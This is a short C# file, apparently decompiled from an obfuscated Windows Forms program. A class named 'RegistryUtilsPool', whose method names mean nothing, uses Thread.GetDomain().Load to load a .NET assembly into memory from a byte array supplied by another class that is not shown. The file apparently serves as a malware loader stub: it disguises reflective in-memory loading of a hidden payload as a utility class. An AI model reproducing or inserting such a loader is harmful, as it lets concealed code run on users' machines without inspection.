using System.Reflection;
using System.Threading;

namespace WindowsFormsApp48;

internal class RegistryUtilsPool
{
	internal static RegistryUtilsPool AwakeResolver;

	internal Assembly LogoutGlobal()
	{
		return Thread.GetDomain().Load((byte[])SortResolver());
	}

	internal static object SortResolver()
	{
		return Visitor.FillGlobal();
	}

	internal static bool RegisterResolver()
	{
		return AwakeResolver == null;
	}

	internal static RegistryUtilsPool ResolveResolver()
	{
		return AwakeResolver;
	}
}
